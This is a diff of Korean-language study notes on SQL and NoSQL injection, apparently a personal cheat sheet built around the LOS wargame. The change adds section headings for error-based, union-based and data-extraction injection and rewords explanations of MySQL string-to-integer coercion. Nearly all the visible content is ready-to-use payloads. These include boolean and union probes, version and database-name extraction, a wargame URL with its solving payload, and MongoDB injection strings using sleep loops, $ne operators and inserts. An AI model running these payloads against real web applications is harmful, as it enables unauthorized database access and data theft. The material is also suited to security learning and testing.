@@ -5,10 +5,12 @@ no=1 and 1=1#
 no=1 and 1=2#
 no=1 and 1=1--%20
 no=1 and 1=2--%20
+
 - 에러 인젝션
 no=0
 no=-1'
 no=-1"
+
 - union 인젝션
 no=1 order by 1--%20
 no=1' order by 2--%20
@@ -17,6 +19,7 @@ no=1' union select 1,NULL--%20
 no=1' union select 1,2,NULL,version(),NULL--%20
 no=1' union select 1,2,NULL,(select version()),NULL--%20
 
+- 취약점을 찾은 후 긁어내기
 no=1 and @@version=1--
 no=1 and (select db_name())=1--
 
@@ -46,13 +49,13 @@ select 'a'=1;   #0
 
 select '1a'=0;   #0
 select '1a'=1;   #1
--> 조금 변환해서 앞에 int값을 추가 후 확인을 해보면 반대의 결과를 얻을 수 있었다.('1a' char값은 앞에 '1' 문자만 int 1로 변환되고
-뒤에 'a'문자는 사라지게 된다. 그래서 1 = 1이 되어 True가 출력하게 된다.
+-> 조금 변환해서 앞에 int값을 추가 후 확인을 해보면 반대의 결과를 얻을 수 있음.
+('1a' char값은 앞에 '1' 문자만 int 1로 변환되고 뒤에 'a'문자는 사라지게 된다. 그래서 1 = 1이 되어 True가 출력함.
 
 select '12a'=0;   #0
 select '12a'=1;   #0
 select '12a'=12;  #1
--> '12a'는 앞에서 살펴본 것 처럼 int 12로 변환되어 12=12로 True가 되는 것을 확인 가능하다~
+-> '12a'는 앞에서 살펴본 것 처럼 int 12로 변환되어 12=12로 True가 되는 것을 확인 가능함.
 
 ex). los 문제에서 다음과 같이 풀 수 있었음.
 los.eagle-jump.org/nightmare_ce407ee88ba848c2bec8e42aaeaa6ad4.php?pw=')=0;%00
@@ -99,7 +102,6 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 ';sleep(5000);
 ';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
 {$ne:"hi"}
-
 
 =================================== MS-SQL Injection ========================================
 
